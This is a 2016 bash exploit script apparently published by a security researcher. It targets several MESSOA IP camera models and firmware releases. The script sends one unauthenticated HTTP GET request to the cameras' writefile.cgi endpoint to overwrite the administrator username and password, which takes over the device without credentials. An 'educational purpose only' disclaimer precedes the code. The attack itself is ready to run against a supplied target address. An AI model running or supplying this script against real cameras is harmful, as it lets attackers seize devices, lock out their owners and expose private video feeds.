# 
#
#  Multiple MESSOA IP-Cameras auth bypass admin user/password changer
#
#  Tested:
#  MESSOA NIC 835 Release: X.2.1.8
#  MESSOA NIC 835-HN5 Release: X.2.1.17
#  MESSOA NIC 836 Release: X.2.1.7
#  MESSOA NDZ 860 Release: X.3.0.6.1
#  MESSOA
#
#  Copyright 2016 (c) Todor Donev 
#  <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  
#  Use them at your own risk!
#  
 
if [[ $# -gt 3 || $# -lt 2 ]]; then
        echo "  [ MESSOA IP-Cameras auth bypass admin user/password changer"
        echo "  [ ==="
        echo "  [ Usage: $0 <target> <user> <password>"
        echo "  [ Example: $0 192.168.1.200:80 hacker teflon"
        echo "  [ ==="
        echo "  [ Copyright 2016 (c) Todor Donev  <todor.donev at gmail.com>" 
        echo "  [ Website:   http://www.ethical-hacker.org/"
        echo "  [ Facebook:  https://www.facebook.com/ethicalhackerorg "
        exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
        echo "  [ Error : libwww-perl not found =/"
        exit;
fi
        GET "http://$1/cgi-bin/writefile.cgi?DEFonoff_adm=&Adm_ID=$2&Adm_Pass1=$3&Adm_Pass2=$3&UpSectionName=ADMINID" 0&> /dev/null <&1
